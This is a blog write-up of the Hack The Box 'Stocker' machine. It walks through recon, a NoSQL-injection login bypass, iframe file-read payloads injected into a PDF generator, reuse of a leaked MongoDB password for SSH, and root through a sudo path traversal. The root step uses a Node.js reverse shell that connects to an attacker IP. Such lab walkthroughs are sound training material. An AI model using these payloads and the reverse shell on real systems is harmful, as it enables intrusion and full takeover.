---
title: "STOCKER HTB EASY"
layout: page
date: 2023-02-23
image: https://miro.medium.com/max/786/0*Wr3Tm8LvmG57ES_2.webp
headerImage: false
tag:
- markdown
- elements
star: true
category: blog
author: Hashar Mujahid
description: Hi This Blog is the writeup of Stocker Machine from Hack The Box.
---



![](https://imgur.com/Koubx31.png)





# PORT SCANS

## TCP:
```bash
hax-13@ZARB:~/Documents/ctfs/htb/easy/stocker$ cat nmap/tcp-port-all.txt 
# Nmap 7.80 scan initiated Sun Jan 29 13:24:55 2023 as: nmap -sC -sV -p- --min-rate 1500 -oN nmap/tcp-port-all.txt 10.10.11.196
Nmap scan report for 10.10.11.196
Host is up (0.59s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 29 13:26:10 2023 -- 1 IP address (1 host up) scanned in 75.03 seconds

```

We have 2 ports open. SSH and Webserver running on port 80.
Let's add `stocker.htb` to hosts file.

## UDP
```bash
hax-13@ZARB:~/Documents/ctfs/htb/easy/stocker$ cat nmap/udp-port-200.txt 
# Nmap 7.80 scan initiated Sun Jan 29 13:31:24 2023 as: nmap -sU -p 1-200 -oN nmap/udp-port-200.txt stocker.htb
Nmap scan report for stocker.htb (10.10.11.196)
Host is up (0.21s latency).
Not shown: 199 closed ports
PORT   STATE         SERVICE
68/udp open|filtered dhcpc

# Nmap done at Sun Jan 29 13:34:59 2023 -- 1 IP address (1 host up) scanned in 214.77 seconds

```

Nothing seems inresting in th udp scan.

# WEBSITE:

Let's visit the website.
![](https://imgur.com/tHt5fpT.png)

The website is a single page HTML based webpage. Nothing seems intresting, let's scan for directories.

## DIrectory Scan.
```bash
hax-13@ZARB:~/Documents/ctfs/htb/easy/stocker/ffuf$ dirsearch --url http://stocker.htb/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/hax-13/.dirsearch/reports/stocker.htb/-_23-02-23_21-39-29.txt

Error Log: /home/hax-13/.dirsearch/logs/errors-23-02-23_21-39-29.log

Target: http://stocker.htb/

[21:39:30] Starting: 
[21:39:31] 301 -  178B  - /js  ->  http://stocker.htb/js/
[21:40:13] 301 -  178B  - /css  ->  http://stocker.htb/css/
[21:40:20] 200 -    1KB - /favicon.ico
[21:40:21] 301 -  178B  - /fonts  ->  http://stocker.htb/fonts/
[21:40:25] 301 -  178B  - /img  ->  http://stocker.htb/img/
[21:40:25] 200 -   15KB - /index.html
[21:40:28] 403 -  564B  - /js/

Task Completed

```
Nothing seems intresting in the directory scan. So let's try to  find some subdomains that this machine might have.
## Virtual Hosts:

```bash
hax-13@ZARB:~/Documents/ctfs/htb/easy/stocker/ffuf$ cat subs                                                              
hax-13@ZARB:~/Documents/ctfs/htb/easy$ ffuf -u http://stocker.htb/ -w /opt/wordlist/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "HOST:
FUZZ.stocker.htb"  -fs 178                                                                                                
                                                                                                                          
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://stocker.htb/
 :: Wordlist         : FUZZ: /opt/wordlist/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.stocker.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: 178
________________________________________________

dev                     [Status: 302, Size: 28, Words: 4, Lines: 1]
:: Progress: [114441/114441] :: Job [1/1] :: 182 req/sec :: Duration: [0:10:26] :: Errors: 0 ::
 :: URL              : http://stocker.htb                                  
 :: Wordlist         : FUZZ: /opt/wordlist/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt                                                   
 :: Filter           : Response lines: 8                                   
dev                     [Status: 302, Size: 28, Words: 4, Lines: 1]                 
```

We have found a subdomain. Let's add this to our hosts file.

## DEV Site:
Let's visit the `dev.stocker.htb`.

![](https://imgur.com/wjRZmkc.png)

We can see this website is built on Node.js and Express.js.
This information could help us. Now my main instinct in when i see a login pannel i try for auth bypass sql injections but let's run a directory scan first.

## Directory Scan:
```bash
hax-13@ZARB:~/Documents/ctfs/htb/easy/stocker/ffuf$ dirsearch --url http://dev.stocker.htb/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/hax-13/.dirsearch/reports/dev.stocker.htb/-_23-02-23_21-49-27.txt

Error Log: /home/hax-13/.dirsearch/logs/errors-23-02-23_21-49-27.log

Target: http://dev.stocker.htb/

[21:49:27] Starting: 
[21:50:34] 200 -    3KB - /login
[21:50:34] 200 -    3KB - /login/
[21:50:35] 302 -   28B  - /logout/  ->  /login
[21:50:35] 302 -   28B  - /logout  ->  /login
[21:51:03] 301 -  179B  - /static  ->  /static/
[21:50:34] 200 -    3KB - /api/

Task Completed
hax-13@ZARB:~/Documents/ctfs/htb/easy/stocker/ffuf$ 

```
Let's do a recursive scan on `/api`.

```bash
hax-13@ZARB:~/Documents/ctfs/htb/easy/stocker/ffuf$ dirsearch --url http://dev.stocker.htb/api/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/hax-13/.dirsearch/reports/dev.stocker.htb/-api-_23-02-23_21-52-36.txt

Error Log: /home/hax-13/.dirsearch/logs/errors-23-02-23_21-52-36.log

Target: http://dev.stocker.htb/api/

[21:52:36] Starting: 
[21:54:01] 200 -    2B  - /api/products

Task Completed

```

After visiting the endpoint couldnot find anything.

Let's check the login pannel for the authentication bypass.

# NOSQL INJECTION IN `DEV.STOCKER.HTB`:

Let's capture the request in burp.

![](https://imgur.com/XjuFtsR.png)


After testing for against various sql and nosql payloads i coundnot abke to bypass the login pannel.
After getting back to it after some time, I remembered in an @ippsec video where he was also testing the login pannel with Node.js backend. He said to test if the web is accepting the json data input,
![](https://imgur.com/Ekik5Fz.png)

We can se we are able to send json data to the backend. We could also test the nosql injection for the json data input.
[PAYLOAD](https://book.hacktricks.xyz/pentesting-web/nosql-injection#:~:text=%7B%22username%22%3A%20%7B%22%24ne%22%3A%20null%7D%2C%20%22password%22%3A%20%7B%22%24ne%22%3A%20null%7D%20%7D)
The payload above we were able to bypass the authentication.
![](https://imgur.com/1r6S6lr.png)

We can see we are redirected to `/stock`.
![](https://imgur.com/v86oyAR.png)

We can order the products and a PDF is generated.
Likewise, we can test the fileds for command execution. And SSRF.
After testing for command inejction, I wasn't exploitable.

#  XSS LEADS -→ SSRF LEADS TO LOCAL FILE INCLUSION:
#ssrf #LFI

We might we able to get ssrf because the PDF generator is likely to be vulnerable to Let's inject some HTML tags to see if they are processed by the backend.
![](https://imgur.com/lHwCdD2.png)

Let's See if website is vulnerable to xss.

![](https://imgur.com/G46wm90.png)

Let's vist the product invoice.
![](https://imgur.com/hY2W5pI.png)

We have  a handy dandy POC.

We can easily chain a SSRF Vulnerability to LFI.
![](https://imgur.com/W1SsObE.png)

```html
<iframe src=file:///etc/passwd height=500 width=500></iframe>
```
![](https://imgur.com/42uyYVs.png)


Let's read the index.js of the dev domain.
```html
<iframe src=file:///var/www/dev/index.js height=800 width=800></iframe>
```

```js

const express = require("express");  
const mongoose = require("mongoose");  
const session = require("express-session");  
const MongoStore = require("connect-mongo");  
const path = require("path");  
const fs = require("fs");  
const { generatePDF, formatHTML } = require("./pdf.js");  
const { randomBytes, createHash } = require("crypto");  
const app = express();  
const port = 3000;  
// TODO: Configure loading from dotenv for production  
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";  
app.use(express.json());  
app.use(express.urlencoded({ extended: false }));  
app.use(  
session({  
secret: randomBytes(32).toString("hex"),  
resave: false,  
saveUninitialized: true,  
store: MongoStore.create({  
mongoUrl: dbURI,  
}),  
})  
);  
app.use("/static", express.static(__dirname + "/assets"));  
app.get("/", (req, res) => {  
return res.redirect("/login");  
});  
app.get("/api/products", async (req, res) => {  
if (!req.session.user) return res.json([]);  
const products = await mongoose.model("Product").find();  
return res.json(products);  
});  
app.get("/login", (req, res) => {  
if (req.session.user) return res.redirect("/stock");  
return res.sendFile(__dirname + "/templates/login.html");  
});  
app.post("/login", async (req, res) => {  
const { username, password } = req.body;  
if (!username || !password) return res.redirect("/login?error=login-error");  
// TODO: Implement hashing
```
Mongodb passwd: `IHeardPassphrasesArePrettySecure`

We can try this paword for the username we saw on the `stocker.htb`.
![](https://imgur.com/GsuGXpv.png)

# FOOTHOLD [Angoose].
Let's try to ssh as a `angoose`.
![](https://imgur.com/e29Nk7C.png)

We succeed.

# PRIVESC

Let's throw linpeas and find any privesc vector.
```bash
angoose@stocker:~$ sudo -l
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js

```

Let's create a `root.js` file in angoose home directory.
```js
angoose@stocker:~$ cat root.js 
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(8786, "10.10.14.126", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();

```

Now start a listner. 
We can execute our payloadlike this.
```bash
angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../../home/angoose/root.js
```

We should have a reverse shell.

![](https://imgur.com/NnlOXQ5.png)
